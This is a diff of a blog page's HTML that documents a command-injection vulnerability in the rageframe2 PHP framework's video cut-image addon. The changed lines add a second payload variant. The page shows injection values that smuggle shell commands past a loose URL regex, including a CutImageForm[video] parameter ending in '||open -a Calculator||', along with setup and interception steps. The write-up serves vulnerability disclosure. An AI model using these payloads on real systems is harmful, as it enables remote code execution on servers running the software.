@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://ffreestanding.github.io/images/TheCommit/image-20230209185534572.png">
 <meta property="og:image" content="https://ffreestanding.github.io/images/TheCommit/image-20230209185619622.png">
 <meta property="article:published_time" content="2023-02-09T13:46:18.000Z">
-<meta property="article:modified_time" content="2023-02-09T13:50:29.432Z">
+<meta property="article:modified_time" content="2023-02-11T13:27:58.450Z">
 <meta property="article:author" content="FFreestanding">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://ffreestanding.github.io/images/TheCommit/image-20230209184509795.png">
@@ -220,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.2k 字
+          2.3k 字
         
       </span>
     
@@ -282,15 +282,15 @@
 
 <p><code>RegularHelper::verify(&#39;url&#39;, $url)</code>equals<code>preg_match(&#39;/(http:\/\/)|(https:\/\/)/i&#39;, $url)</code></p>
 <p>video&#x3D;<code>http://aaa;cmd;</code>can satisfy<code>RegularHelper::verify(&#39;url&#39;, $url)</code></p>
-<p>so we use<code>$filePath=&#39;xxx&#39;.http://aaa;cmd;</code>to RCE</p>
+<p>so we use <code>$filePath=&#39;xxx&#39;.http://aaa;cmd;</code> or <code>$filePath=&#39;xxx&#39;.http://aaa || cmd ||</code>to RCE</p>
 <h2 id="Construction-of-environment"><a href="#Construction-of-environment" class="headerlink" title="Construction of environment"></a>Construction of environment</h2><p>follow the document to install</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/jianyan74/rageframe2/blob/master/docs/guide-zh-CN/start-installation.md">installation</a></p>
 <h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>Install a addon</p>
-<p><img src="/../images/TheCommit/image-20230209184509795.png" srcset="/img/loading.gif" lazyload alt="image-20230209184509795"></p>
+<p><img src="/../images/TheCommit/image-20230209184509795.png" srcset="/img/loading.gif" lazyload></p>
 <p>Then visit <a target="_blank" rel="noopener" href="http://localhost/backend/rf-example/video/cut-image">http://localhost/backend/rf-example/video/cut-image</a>, try to upload a mp3 and save</p>
-<p><img src="/../images/TheCommit/image-20230209185534572.png" srcset="/img/loading.gif" lazyload alt="image-20230209185534572"></p>
+<p><img src="/../images/TheCommit/image-20230209185534572.png" srcset="/img/loading.gif" lazyload></p>
 <p>Finally we can catch a package</p>
-<p><img src="/../images/TheCommit/image-20230209185619622.png" srcset="/img/loading.gif" lazyload alt="image-20230209185619622"></p>
+<p><img src="/../images/TheCommit/image-20230209185619622.png" srcset="/img/loading.gif" lazyload></p>
 <p>Send the package to <strong>Repeater</strong></p>
 <h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>change CutImageForm[video] like below</p>
 <p><code>CutImageForm[video]=http%3A%2F%2Flocalhost%2Fattachment%2Fvideos%2F2023%2F02%2F09%2Fmeeting_04.mp4+||open+-a+Calculator+||</code></p>
